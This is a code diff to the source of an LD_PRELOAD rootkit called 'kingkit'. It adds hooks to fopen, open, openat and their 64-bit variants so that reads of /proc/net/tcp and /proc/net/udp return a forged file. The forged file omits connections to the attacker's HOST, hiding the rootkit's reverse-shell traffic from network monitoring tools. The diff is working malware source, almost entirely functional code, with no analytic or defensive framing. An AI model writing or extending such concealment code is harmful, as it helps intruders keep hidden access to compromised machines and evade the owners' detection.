@@ -55,6 +55,7 @@ int king();
 void revshell();
 int is_hidden(char *);
 int is_protected(char *);
+int forge_procnet(char *pathname);
 
 
 //hooks declarations
@@ -311,6 +312,54 @@ int is_hidden(char *pathname) {
 }
 
 
+int is_procnet(char *pathname) {
+    #if DEBUG
+    printf("[kingkit] is_procnet() called with pathname: %s.\n", pathname);
+    #endif
+    return
+        strncmp(pathname, "/proc/", 6) == 0 && (
+            strcmp(pathname + 6 + strcspn(pathname + 6, "/"), "/net/tcp") == 0 ||
+            strcmp(pathname + 6 + strcspn(pathname + 6, "/"), "/net/udp") == 0
+        ); //this complicated check is needed because resolving /proc/net/tcp leads to /proc/<pid>/net/tcp
+}
+
+
+int forge_procnet(char *pathname) {
+    #if DEBUG
+    printf("[kingkit] open_procnet() called with pathname: %s.\n", pathname);
+    #endif
+    original_fopen = syscall_address(original_fopen, "fopen");
+    original_open = syscall_address(original_open, "open");
+    FILE *fptr = original_fopen(pathname, "r");
+    int forged_fd = original_open("/tmp", O_TMPFILE | O_EXCL | O_RDWR, S_IRWXU);
+    if (fptr == NULL || forged_fd == -1) {
+        return -1;
+    }
+
+    char line[LINE_MAX];
+    unsigned long rxq, txq, time_len, retr, inode;
+    int local_port, rem_port, d, state, uid, timer_run, timeout;
+    char rem_addr[128], local_addr[128], more[512 + 1];
+    while (fgets(line, sizeof(line), fptr) != NULL) {
+        sscanf(line,
+            "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
+            &d, local_addr, &local_port, rem_addr, &rem_port, &state, &txq, &rxq,
+            &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
+        //parse rem_addr
+        int octets[4];
+        sscanf(rem_addr, "%2x%2x%2x%2x", octets + 3, octets + 2, octets + 1, octets); //note that octets are reversed
+        char rem_ip[16];
+        snprintf(rem_ip, sizeof(rem_ip), "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]); //put the list of octets together
+        if (strcmp(rem_ip, HOST) == 0) {
+            continue;
+        }
+        write(forged_fd, line, strlen(line));
+    }
+    lseek(forged_fd, 0, SEEK_SET);
+    return forged_fd;
+}
+
+
 
 //hooks
 
@@ -378,7 +427,11 @@ FILE *fopen(const char *restrict pathname, const char *restrict mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_fopen)(pathname, mode);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        FILE *fptr = fdopen(forge_procnet(real_pathname), "r+");
+        free(real_pathname);
+        return fptr;
+    } else if (is_protected(real_pathname)) {
         mode = "r";
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
@@ -398,7 +451,11 @@ FILE *fopen64(const char *restrict pathname, const char *restrict mode) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_fopen64)(pathname, mode);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        FILE *fptr = fdopen(forge_procnet(real_pathname), "r+");
+        free(real_pathname);
+        return fptr;
+    } else if (is_protected(real_pathname)) {
         mode = "r";
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
@@ -418,7 +475,11 @@ int open(const char *pathname, int flags, ...) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_open)(pathname, flags, FILEMODE);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        int fd = forge_procnet(real_pathname);
+        free(real_pathname);
+        return fd;
+    } else if (is_protected(real_pathname)) {
         flags = O_RDONLY;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
@@ -438,7 +499,11 @@ int open64(const char *pathname, int flags, ...) {
     char *real_pathname = realpath(pathname, NULL);
     if (real_pathname == NULL)
         return (*original_open64)(pathname, flags, FILEMODE);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        int fd = forge_procnet(real_pathname);
+        free(real_pathname);
+        return fd;
+    } else if (is_protected(real_pathname)) {
         flags = O_RDONLY;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
@@ -504,7 +569,11 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
         return (*original_openat)(dirfd, pathname, flags, FILEMODE);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        int fd = forge_procnet(real_pathname);
+        free(real_pathname);
+        return fd;
+    } else if (is_protected(real_pathname)) {
         flags = O_RDONLY;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
@@ -524,7 +593,11 @@ int openat64(int dirfd, const char *pathname, int flags, ...) {
     char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
     if (real_pathname == NULL)
         return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
-    if (is_protected(real_pathname)) {
+    if (is_procnet(real_pathname)) {
+        int fd = forge_procnet(real_pathname);
+        free(real_pathname);
+        return fd;
+    } else if (is_protected(real_pathname)) {
         flags = O_RDONLY;
     }
     else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
